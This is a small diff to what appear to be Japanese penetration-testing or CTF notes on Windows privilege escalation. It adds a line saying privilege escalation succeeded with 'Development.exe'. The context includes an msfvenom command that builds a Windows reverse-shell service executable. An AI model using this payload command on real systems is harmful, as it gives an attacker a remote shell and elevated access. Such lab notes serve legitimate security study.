@@ -44,3 +44,4 @@ C:\Windows\system32>
 msfvenom -p windows/x64/shell_reverse_tcp LHOST= LPORT=<Port> -f exe-service -o [output.exe]
 ```
 
+- Development.exeを使用して、権限昇格成功
